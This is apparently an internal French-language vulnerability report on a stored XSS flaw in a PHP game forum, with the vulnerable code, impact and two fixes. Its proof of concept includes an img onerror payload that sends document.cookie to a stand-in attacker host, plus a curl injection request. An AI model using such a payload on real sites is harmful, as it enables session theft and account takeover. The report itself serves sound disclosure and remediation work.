# Rapport de vulnérabilité — XSS Stockée dans le forum

**Date :** 2026-08-28  
**Sévérité :** CRITIQUE  
**Statut :** Non corrigé

---

## Résumé

Le contenu des posts du forum est affiché sans sanitization HTML. Un attaquant authentifié peut poster un message contenant du JavaScript malveillant qui s'exécute dans le navigateur de tous les lecteurs du topic.

---

## Localisation

| Fichier | Ligne | Variable vulnérable |
|---------|-------|---------------------|
| `php/forum/functions.php` | 12-14 | `$text` retourné brut si HTML détecté |
| `php/forum/view_topic.php` | 52, 69 | `echo render_post_body(...)` |
| `php/forum/view_topic.php` | 119 | `bodyInput.value = quill.root.innerHTML` |

---

## Cause racine

### Côté affichage — `functions.php:12-14`

```php
function render_post_body($text) {
    if (strpos($text, '<') !== false && strpos($text, '>') !== false) {
        return $text;  // HTML retourné brut sans aucun échappement
    }
    // ...
}
```

Tout message contenant `<` et `>` est retourné tel quel dans la page.

### Côté soumission — `view_topic.php:119`

```javascript
form.onsubmit = function() {
    bodyInput.value = quill.root.innerHTML;  // HTML brut envoyé au serveur
};
```

Le contenu Quill (HTML riche) est soumis sans sanitization.

---

## Conditions d'exploitation

| Condition | Valeur |
|-----------|--------|
| Authentification | Oui — n'importe quel compte joueur |
| Complexité | Très faible |
| Outils nécessaires | Navigateur web (éditeur Quill intégré) |

---

## Proof of Concept

### Payload

Poster un message dans le forum avec le corps suivant (via l'API ou l'éditeur Quill) :

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

### Requête HTTP directe

```bash
curl -X POST http://localhost:666/forum/post.php \
  -b "PHPSESSID=<session_valide>" \
  -d "id_parent=1&id_forum=1&title=Re:+test&body=<img+src=x+onerror=console.log(document.cookie)>"
```

### Résultat

Chaque joueur visitant le topic exécute le script. Les cookies de session sont accessibles (flag `HttpOnly` absent — voir rapport cookies de session).

---

## Impact

- **Vol de sessions** : récupération du `PHPSESSID` de tous les lecteurs
- **Usurpation de compte** : connexion sous l'identité des victimes
- **Passage d'ordres** : ordres de jeu passés au nom des joueurs compromis
- **Persistance** : le payload reste en base de données et affecte tous les visiteurs futurs

---

## Correctif

### Option 1 — Sanitization avec HTMLPurifier (recommandé)

```php
require_once 'HTMLPurifier.auto.php';
function render_post_body($text) {
    $config   = HTMLPurifier_Config::createDefault();
    $purifier = new HTMLPurifier($config);
    return $purifier->purify($text);
}
```

### Option 2 — Échappement complet (perd la mise en forme Quill)

```php
function render_post_body($text) {
    return nl2br(htmlspecialchars($text, ENT_QUOTES, 'UTF-8'));
}
```

---

## Timeline

| Date | Événement |
|------|-----------|
| 2026-08-28 | Découverte lors de l'analyse de `functions.php` |
| 2026-08-28 | Rapport rédigé |
| En attente | Correction |
